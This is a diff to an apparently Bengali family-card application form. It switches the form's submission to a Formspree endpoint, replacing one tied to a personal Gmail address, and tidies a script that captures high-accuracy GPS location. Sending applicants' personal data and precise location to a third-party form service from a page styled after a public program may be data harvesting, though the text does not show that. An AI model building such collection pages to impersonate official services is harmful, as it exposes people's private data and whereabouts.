@@ -241,8 +241,8 @@
         <p style="font-size: 12px; color: #555;">ফ্যামিলি কার্ড পাইলেটিং বাস্তবায়ন গাইডলাইন, ২০২৬</p>
     </div>
 
-    <!-- ইমেইলে ডাটা পাঠানোর অটোমেটিক সার্ভিস লিংক -->
-    <form action="https://formspree.io/f/theownerofsucide@gmail.com" method="POST" enctype="multipart/form-data">
+    <!-- আপডেট করা Formspree এন্ডপয়েন্ট -->
+    <form action="https://formspree.io/f/mgogpkyj" method="POST" enctype="multipart/form-data">
         
         <!-- ১-২ আবেদনকারীর নাম -->
         <div class="form-group">
@@ -805,7 +805,7 @@
     </form>
 </div>
 
-<!-- জিও-লোকেশন (GPS) বের করার উন্নত JavaScript (Best Practice) -->
+<!-- জিও-লোকেশন (GPS) বের করার JavaScript -->
 <script>
     function getLocation() {
         var status = document.getElementById("geo-status");
@@ -816,11 +816,10 @@
             status.innerText = "⏳ জিপিএস লোকেশন নেওয়া হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...";
             btn.disabled = true;
 
-            // GPS Best Practices Options
             var geoOptions = {
-                enableHighAccuracy: true, // সর্বোচ্চ একিউরেসি নিশ্চিত করবে
-                timeout: 10000,          // ১০ সেকেন্ড অপেক্ষা করবে
-                maximumAge: 0            // কোনো ক্যাশড লোকেশন ব্যবহার করবে না
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             };
 
             navigator.geolocation.getCurrentPosition(showPosition, showError, geoOptions);
@@ -866,4 +865,4 @@
 </script>
 
 </body>
-</html>
+            </html>
